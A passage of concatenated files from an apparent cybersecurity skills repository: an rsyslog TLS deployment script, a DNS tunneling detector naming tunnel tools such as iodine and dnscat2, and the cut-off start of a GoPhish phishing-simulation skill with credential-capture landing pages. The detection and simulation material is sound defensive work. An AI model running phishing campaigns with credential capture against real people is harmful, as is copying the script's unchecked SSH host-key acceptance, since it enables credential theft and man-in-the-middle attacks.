      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-syslog-centralization-with-rsyslog/references/api-reference.md =====
# API Reference: Rsyslog Centralization with TLS

## Rsyslog Server Configuration Directives

### TLS Module Loading
```
module(load="imtcp"
    StreamDriver.Name="gtls"
    StreamDriver.Mode="1"
    StreamDriver.Authmode="x509/name"
    PermittedPeer=["client1.local","client2.local"])
```

### Global TLS Settings
```
global(
    DefaultNetstreamDriver="gtls"
    DefaultNetstreamDriverCAFile="/path/to/ca.pem"
    DefaultNetstreamDriverCertFile="/path/to/cert.pem"
    DefaultNetstreamDriverKeyFile="/path/to/key.pem")
```

### Template Syntax
```
template(name="PerHostDir" type="string"
    string="/var/log/remote/%HOSTNAME%/%PROGRAMNAME%.log")
template(name="JSONFormat" type="string"
    string='{"host":"%HOSTNAME%","msg":"%msg:::json%"}\n')
```

## Rsyslog Client Forwarding
```
action(type="omfwd" target="<server>" port="6514" protocol="tcp"
    StreamDriver="gtls" StreamDriverMode="1"
    StreamDriverAuthMode="x509/name"
    queue.type="LinkedList" queue.filename="fwdRule1"
    queue.maxdiskspace="1g" queue.saveonshutdown="on"
    action.resumeRetryCount="-1")
```

## Jinja2 Template Engine
```python
from jinja2 import Template
tmpl = Template("target={{ server_ip }} port={{ port }}")
output = tmpl.render(server_ip="10.0.0.1", port=6514)
```

## Paramiko SSH Deployment
```python
import paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(hostname=host, username=user, key_filename=key)
sftp = client.open_sftp()
sftp.file(remote_path, "w").write(content)
client.exec_command("systemctl restart rsyslog")
client.close()
```

## OpenSSL Certificate Generation
```bash
openssl req -x509 -newkey rsa:4096 -keyout ca-key.pem -out ca.pem -days 3650 -nodes
openssl req -newkey rsa:2048 -keyout server-key.pem -out server.csr -nodes
openssl x509 -req -in server.csr -CA ca.pem -CAkey ca-key.pem -out server-cert.pem
```

===== END FILE =====


===== FILE: skills/implementing-syslog-centralization-with-rsyslog/scripts/agent.py =====
#!/usr/bin/env python3
"""Rsyslog Centralization Agent - Generates and deploys TLS-secured rsyslog configurations."""

import json
import logging
import argparse
import subprocess
from datetime import datetime

from jinja2 import Template

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

SERVER_TEMPLATE = Template("""\
# Rsyslog Server Configuration - TLS Centralized Logging
# Generated by Syslog Centralization Agent

# Load modules
module(load="imuxsock")
module(load="imklog")
module(load="imtcp"
    StreamDriver.Name="gtls"
    StreamDriver.Mode="1"
    StreamDriver.Authmode="x509/name"
    PermittedPeer=["{{ permitted_peers | join('","') }}"]
)

# TLS Certificate Configuration
global(
    DefaultNetstreamDriver="gtls"
    DefaultNetstreamDriverCAFile="{{ ca_cert }}"
    DefaultNetstreamDriverCertFile="{{ server_cert }}"
    DefaultNetstreamDriverKeyFile="{{ server_key }}"
)

# TLS Listener
input(type="imtcp" port="{{ tls_port }}")

# Templates
template(name="PerHostDir" type="string"
    string="/var/log/remote/%HOSTNAME%/%PROGRAMNAME%.log")

template(name="JSONFormat" type="string"
    string='{"timestamp":"%TIMESTAMP:::date-rfc3339%","host":"%HOSTNAME%","facility":"%syslogfacility-text%","severity":"%syslogseverity-text%","program":"%PROGRAMNAME%","msg":"%msg:::json%"}\\n')

template(name="PerHostJSON" type="string"
    string="/var/log/remote/%HOSTNAME%/json/%PROGRAMNAME%.json")

# Rules - Store per-host with standard format
*.* ?PerHostDir

# Also store in JSON format for SIEM ingestion
*.* ?PerHostJSON;JSONFormat

# High-severity alerts to dedicated file
*.err /var/log/remote/errors.log
""")

CLIENT_TEMPLATE = Template("""\
# Rsyslog Client Configuration - TLS Forwarding
# Generated by Syslog Centralization Agent

# TLS Certificate Configuration
global(
    DefaultNetstreamDriver="gtls"
    DefaultNetstreamDriverCAFile="{{ ca_cert }}"
    DefaultNetstreamDriverCertFile="{{ client_cert }}"
    DefaultNetstreamDriverKeyFile="{{ client_key }}"
)

# Forward all logs to central server with TLS and reliable queue
action(
    type="omfwd"
    target="{{ server_ip }}"
    port="{{ tls_port }}"
    protocol="tcp"
    StreamDriver="gtls"
    StreamDriverMode="1"
    StreamDriverAuthMode="x509/name"
    StreamDriverPermittedPeers="{{ server_ip }}"
    queue.type="LinkedList"
    queue.filename="fwdRule1"
    queue.maxdiskspace="{{ queue_disk_space }}"
    queue.saveonshutdown="on"
    queue.size="{{ queue_size }}"
    action.resumeRetryCount="-1"
    action.resumeInterval="30"
)
""")


def generate_server_config(server_ip, clients, ca_cert, server_cert, server_key, tls_port=6514):
    """Generate rsyslog server configuration with TLS."""
    config = SERVER_TEMPLATE.render(
        permitted_peers=clients + [server_ip],
        ca_cert=ca_cert,
        server_cert=server_cert,
        server_key=server_key,
        tls_port=tls_port,
    )
    logger.info("Generated server config for %s with %d permitted peers", server_ip, len(clients))
    return config


def generate_client_config(server_ip, ca_cert, client_cert, client_key, tls_port=6514):
    """Generate rsyslog client configuration with TLS forwarding."""
    config = CLIENT_TEMPLATE.render(
        server_ip=server_ip,
        ca_cert=ca_cert,
        client_cert=client_cert,
        client_key=client_key,
        tls_port=tls_port,
        queue_disk_space="1g",
        queue_size="50000",
    )
    logger.info("Generated client config forwarding to %s:%d", server_ip, tls_port)
    return config


def generate_tls_certificates(output_dir, server_cn, client_cns):
    """Generate CA, server, and client TLS certificates using OpenSSL."""
    ca_key = f"{output_dir}/ca-key.pem"
    ca_cert = f"{output_dir}/ca.pem"
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:4096", "-keyout", ca_key,
        "-out", ca_cert, "-days", "3650", "-nodes",
        "-subj", f"/CN=Syslog CA/O=SOC/C=US",
    ], capture_output=True, check=True, timeout=120)
    logger.info("Generated CA certificate: %s", ca_cert)

    for cn in [server_cn] + client_cns:
        key_file = f"{output_dir}/{cn}-key.pem"
        cert_file = f"{output_dir}/{cn}-cert.pem"
        csr_file = f"{output_dir}/{cn}.csr"
        subprocess.run([
            "openssl", "req", "-newkey", "rsa:2048", "-keyout", key_file,
            "-out", csr_file, "-nodes", "-subj", f"/CN={cn}/O=SOC/C=US",
        ], capture_output=True, check=True, timeout=120)
        subprocess.run([
            "openssl", "x509", "-req", "-in", csr_file, "-CA", ca_cert,
            "-CAkey", ca_key, "-CAcreateserial", "-out", cert_file, "-days", "365",
        ], capture_output=True, check=True, timeout=120)
        logger.info("Generated certificate for %s", cn)
    return ca_cert


def deploy_config_ssh(host, config_content, remote_path, username="root", key_file=None):
    """Deploy rsyslog configuration to a remote host via SSH."""
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    connect_kwargs = {"hostname": host, "username": username}
    if key_file:
        connect_kwargs["key_filename"] = key_file
    client.connect(**connect_kwargs)
    sftp = client.open_sftp()
    with sftp.file(remote_path, "w") as f:
        f.write(config_content)
    sftp.close()
    _, stdout, stderr = client.exec_command("systemctl restart rsyslog")
    exit_status = stdout.channel.recv_exit_status()
    client.close()
    logger.info("Deployed config to %s:%s (restart exit: %d)", host, remote_path, exit_status)
    return exit_status == 0


def validate_tls_connection(server_ip, tls_port=6514, ca_cert=None):
    """Validate TLS connectivity to the rsyslog server."""
    cmd = [
        "openssl", "s_client", "-connect", f"{server_ip}:{tls_port}",
        "-CAfile", ca_cert or "/etc/ssl/certs/ca-certificates.crt",
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, input="")
        connected = "Verify return code: 0" in result.stdout
        logger.info("TLS validation to %s:%d: %s", server_ip, tls_port, "OK" if connected else "FAILED")
        return connected
    except subprocess.TimeoutExpired:
        return False


def generate_report(server_config, client_configs, deployments, tls_valid):
    """Generate syslog centralization deployment report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "server_config_generated": bool(server_config),
        "client_configs_generated": len(client_configs),
        "deployments": deployments,
        "tls_validated": tls_valid,
    }
    print(f"SYSLOG REPORT: {len(client_configs)} client configs, TLS: {'OK' if tls_valid else 'PENDING'}")
    return report


def main():
    parser = argparse.ArgumentParser(description="Rsyslog Centralization Agent")
    parser.add_argument("--server-ip", required=True, help="Syslog server IP")
    parser.add_argument("--clients", required=True, help="Comma-separated client IPs")
    parser.add_argument("--ca-cert", default="/etc/rsyslog.d/ca.pem")
    parser.add_argument("--server-cert", default="/etc/rsyslog.d/server-cert.pem")
    parser.add_argument("--server-key", default="/etc/rsyslog.d/server-key.pem")
    parser.add_argument("--tls-port", type=int, default=6514)
    parser.add_argument("--deploy", action="store_true", help="Deploy configs via SSH")
    parser.add_argument("--config-dir", default="./rsyslog_configs")
    parser.add_argument("--output", default="syslog_report.json")
    args = parser.parse_args()

    clients = [c.strip() for c in args.clients.split(",")]
    import os
    os.makedirs(args.config_dir, exist_ok=True)

    server_config = generate_server_config(
        args.server_ip, clients, args.ca_cert, args.server_cert, args.server_key, args.tls_port
    )
    with open(f"{args.config_dir}/server.conf", "w") as f:
        f.write(server_config)

    client_configs = {}
    for client_ip in clients:
        config = generate_client_config(
            args.server_ip, args.ca_cert,
            f"/etc/rsyslog.d/{client_ip}-cert.pem",
            f"/etc/rsyslog.d/{client_ip}-key.pem",
            args.tls_port,
        )
        with open(f"{args.config_dir}/client-{client_ip}.conf", "w") as f:
            f.write(config)
        client_configs[client_ip] = config

    deployments = []
    if args.deploy:
        for client_ip, config in client_configs.items():
            ok = deploy_config_ssh(client_ip, config, "/etc/rsyslog.d/99-central.conf")
            deployments.append({"host": client_ip, "success": ok})

    tls_valid = validate_tls_connection(args.server_ip, args.tls_port, args.ca_cert)
    report = generate_report(server_config, client_configs, deployments, tls_valid)

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-dns-tunneling-detection/SKILL.md =====
---
name: performing-dns-tunneling-detection
description: 'Detects DNS tunneling by computing Shannon entropy of DNS query names,
  analyzing query length distributions, inspecting TXT record payloads, and identifying
  high subdomain cardinality. Uses scapy for packet capture analysis and statistical
  methods to distinguish legitimate DNS from covert channels. Use when hunting for
  data exfiltration.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- dns-tunneling
- exfiltration-detection
- shannon-entropy
- dns-analysis
- threat-detection
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1048
- T1041
---

# Performing DNS Tunneling Detection


## When to Use

- When conducting security assessments that involve performing dns tunneling detection
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Analyze DNS traffic for indicators of DNS tunneling using entropy analysis and
statistical methods on query name characteristics.

```python
import math
from collections import Counter

def shannon_entropy(data):
    if not data:
        return 0
    counter = Counter(data)
    length = len(data)
    return -sum((c/length) * math.log2(c/length) for c in counter.values())

# Legitimate domain: low entropy (~3.0-3.5)
print(shannon_entropy("www.google.com"))
# DNS tunnel: high entropy (~4.0-5.0)
print(shannon_entropy("aGVsbG8gd29ybGQ.tunnel.example.com"))
```

Key detection indicators:
1. High Shannon entropy in query names (> 3.5 for subdomain labels)
2. Unusually long query names (> 50 characters)
3. High volume of TXT record requests to a single domain
4. High unique subdomain count per parent domain
5. Non-standard character distribution in labels

## Examples

```python
from scapy.all import rdpcap, DNS, DNSQR
packets = rdpcap("dns_traffic.pcap")
for pkt in packets:
    if pkt.haslayer(DNSQR):
        query = pkt[DNSQR].qname.decode()
        entropy = shannon_entropy(query)
        if entropy > 4.0:
            print(f"Suspicious: {query} (entropy={entropy:.2f})")
```

===== END FILE =====


===== FILE: skills/performing-dns-tunneling-detection/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-dns-tunneling-detection/references/api-reference.md =====
# API Reference: Performing DNS Tunneling Detection

## scapy (DNS Packet Analysis)

```python
from scapy.all import rdpcap, DNS, DNSQR, DNSRR, sniff

# Read from PCAP
packets = rdpcap("traffic.pcap")
for pkt in packets:
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode()
        qtype = pkt[DNSQR].qtype  # 1=A, 16=TXT, 28=AAAA

# Live capture
def dns_callback(pkt):
    if pkt.haslayer(DNSQR):
        print(pkt[DNSQR].qname)

sniff(filter="udp port 53", prn=dns_callback, count=100)
```

## Shannon Entropy Calculation

```python
import math
from collections import Counter

def shannon_entropy(data):
    counter = Counter(data)
    length = len(data)
    return -sum((c/length) * math.log2(c/length)
                for c in counter.values())

# Normal domain: ~2.5-3.5 bits
# DNS tunnel:    ~4.0-5.0 bits
```

## DNS Tunneling Indicators

| Indicator | Threshold | Rationale |
|-----------|-----------|-----------|
| Subdomain entropy | > 3.8 | Encoded/encrypted data |
| Query length | > 50 chars | Payload in subdomain |
| TXT queries/domain | > 20/hour | Data channel |
| Unique subdomains | > 50/parent | Encoded sessions |
| Digit ratio | > 0.4 | Base64/hex encoding |

## Common DNS Tunnel Tools

| Tool | Encoding | Record Types |
|------|----------|-------------|
| iodine | Base128 | NULL, TXT, CNAME |
| dnscat2 | Hex/CNAME | TXT, MX, CNAME |
| dns2tcp | Base64 | TXT, KEY |

### References

- scapy: https://scapy.readthedocs.io/en/latest/
- DNS tunneling detection: https://www.sans.org/white-papers/dns-tunneling/
- iodine: https://github.com/yarrick/iodine

===== END FILE =====


===== FILE: skills/performing-dns-tunneling-detection/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for detecting DNS tunneling via entropy and statistical analysis."""

import json
import math
import argparse
from collections import Counter, defaultdict
from datetime import datetime

from scapy.all import rdpcap, DNS, DNSQR


def shannon_entropy(data):
    """Calculate Shannon entropy of a string."""
    if not data:
        return 0.0
    counter = Counter(data)
    length = len(data)
    return -sum((count / length) * math.log2(count / length) for count in counter.values())


def extract_dns_queries(pcap_path):
    """Extract DNS queries from a PCAP file using scapy."""
    packets = rdpcap(pcap_path)
    queries = []
    for pkt in packets:
        if pkt.haslayer(DNSQR):
            qname = pkt[DNSQR].qname.decode().rstrip(".")
            qtype = pkt[DNSQR].qtype
            src_ip = pkt.src if hasattr(pkt, "src") else ""
            queries.append({
                "query": qname,
                "qtype": qtype,
                "src_ip": src_ip,
                "timestamp": float(pkt.time),
            })
    return queries


def analyze_entropy(queries, threshold=3.8):
    """Flag queries with high Shannon entropy in subdomain labels."""
    suspicious = []
    for q in queries:
        domain = q["query"]
        labels = domain.split(".")
        if len(labels) < 2:
            continue
        subdomain = ".".join(labels[:-2])
        if not subdomain:
            continue
        entropy = shannon_entropy(subdomain)
        if entropy > threshold:
            suspicious.append({
                "query": domain,
                "subdomain": subdomain,
                "entropy": round(entropy, 3),
                "length": len(subdomain),
                "src_ip": q.get("src_ip", ""),
            })
    return sorted(suspicious, key=lambda x: x["entropy"], reverse=True)


def analyze_query_lengths(queries, length_threshold=50):
    """Detect queries with unusually long domain names."""
    long_queries = []
    for q in queries:
        if len(q["query"]) > length_threshold:
            long_queries.append({
                "query": q["query"],
                "length": len(q["query"]),
                "src_ip": q.get("src_ip", ""),
            })
    return long_queries


def analyze_txt_records(pcap_path):
    """Detect high volume of TXT record queries to single domains."""
    packets = rdpcap(pcap_path)
    txt_counts = defaultdict(int)
    for pkt in packets:
        if pkt.haslayer(DNSQR) and pkt[DNSQR].qtype == 16:
            domain = pkt[DNSQR].qname.decode().rstrip(".")
            parent = ".".join(domain.split(".")[-2:])
            txt_counts[parent] += 1
    suspicious = [
        {"domain": d, "txt_query_count": c}
        for d, c in txt_counts.items() if c > 20
    ]
    return sorted(suspicious, key=lambda x: x["txt_query_count"], reverse=True)


def analyze_subdomain_cardinality(queries):
    """Detect domains with high unique subdomain count (tunneling indicator)."""
    parent_subdomains = defaultdict(set)
    for q in queries:
        labels = q["query"].split(".")
        if len(labels) >= 3:
            parent = ".".join(labels[-2:])
            subdomain = ".".join(labels[:-2])
            parent_subdomains[parent].add(subdomain)
    high_cardinality = []
    for parent, subs in parent_subdomains.items():
        if len(subs) > 50:
            high_cardinality.append({
                "parent_domain": parent,
                "unique_subdomains": len(subs),
                "sample_subdomains": list(subs)[:5],
            })
    return sorted(high_cardinality, key=lambda x: x["unique_subdomains"], reverse=True)


def analyze_character_distribution(queries):
    """Detect non-standard character frequency in query labels."""
    suspicious = []
    for q in queries:
        labels = q["query"].split(".")
        subdomain = ".".join(labels[:-2])
        if len(subdomain) < 10:
            continue
        alpha_count = sum(1 for c in subdomain if c.isalpha())
        digit_count = sum(1 for c in subdomain if c.isdigit())
        total = len(subdomain.replace(".", ""))
        if total == 0:
            continue
        digit_ratio = digit_count / total
        if digit_ratio > 0.4 or (alpha_count / total) < 0.5:
            suspicious.append({
                "query": q["query"],
                "digit_ratio": round(digit_ratio, 3),
                "subdomain_length": len(subdomain),
            })
    return suspicious


def main():
    parser = argparse.ArgumentParser(description="DNS Tunneling Detection Agent")
    parser.add_argument("--pcap", required=True, help="Path to PCAP file")
    parser.add_argument("--entropy-threshold", type=float, default=3.8)
    parser.add_argument("--output", default="dns_tunnel_report.json")
    parser.add_argument("--action", choices=[
        "entropy", "length", "txt", "cardinality", "full_analysis"
    ], default="full_analysis")
    args = parser.parse_args()

    report = {"pcap": args.pcap, "generated_at": datetime.utcnow().isoformat(),
              "findings": {}}

    queries = extract_dns_queries(args.pcap)
    report["total_queries"] = len(queries)
    print(f"[+] Extracted {len(queries)} DNS queries from {args.pcap}")

    if args.action in ("entropy", "full_analysis"):
        high_entropy = analyze_entropy(queries, args.entropy_threshold)
        report["findings"]["high_entropy"] = high_entropy
        print(f"[+] High entropy queries: {len(high_entropy)}")

    if args.action in ("length", "full_analysis"):
        long_q = analyze_query_lengths(queries)
        report["findings"]["long_queries"] = long_q
        print(f"[+] Long queries (>50 chars): {len(long_q)}")

    if args.action in ("txt", "full_analysis"):
        txt = analyze_txt_records(args.pcap)
        report["findings"]["txt_anomalies"] = txt
        print(f"[+] TXT record anomalies: {len(txt)}")

    if args.action in ("cardinality", "full_analysis"):
        cardinality = analyze_subdomain_cardinality(queries)
        report["findings"]["high_cardinality"] = cardinality
        print(f"[+] High cardinality domains: {len(cardinality)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-red-team-phishing-with-gophish/SKILL.md =====
---
name: performing-red-team-phishing-with-gophish
description: Automates GoPhish phishing simulation campaigns using the Python gophish
  library, creating email templates with tracking pixels, configuring SMTP sending
  profiles, building target groups from CSV, launching campaigns, and analyzing results
  such as open rates, click rates, and credential submission statistics. Use when
  running an authorized phishing simulation or security awareness assessment via GoPhish.
domain: cybersecurity
subdomain: security-operations
tags:
- red-teaming
- phishing-simulation
- gophish
- social-engineering
- campaign-automation
- security-awareness
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1003
- T1110
mitre_f3:
  version: '1.1'
  tactics:
  - resource-development
  - reconnaissance
  - initial-access
  techniques:
  - id: T1598
    name: Phishing for Information
    tactic: reconnaissance
    source: attack
  - id: T1660
    name: Phishing
    tactic: initial-access
    source: attack
  - id: F1020.002
    name: 'Create Fake Materials: Fake Website'
    tactic: resource-development
    source: f3
  - id: T1583.001
    name: 'Acquire Infrastructure: Domains'
    tactic: resource-development
    source: attack
  - id: F1006.002
    name: 'Account Takeover: Exposed Login Credential'
    tactic: initial-access
    source: f3
---


## When to Use

- When conducting security assessments that involve performing red team phishing with gophish
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

1. Install dependencies: `pip install gophish requests`
2. Deploy GoPhish server and obtain an API key from Settings.
3. Use the Python gophish library to automate campaign setup:
   - Create email templates with HTML body and tracking
   - Configure SMTP sending profiles
   - Import target groups from CSV
   - Create landing pages for credential capture
   - Launch and monitor campaigns
4. Analyze campaign results: opens, clicks, submitted data, reported.

```bash
# For authorized penetration testing and lab environments only
python scripts/agent.py --gophish-url https://localhost:3333 --api-key <key> --campaign-name "Q1 Awareness" --output phishing_report.json
```

## Examples

### Create Campaign via API
```python
from gophish import Gophish
from gophish.models import Campaign, Template, Group, SMTP, Page
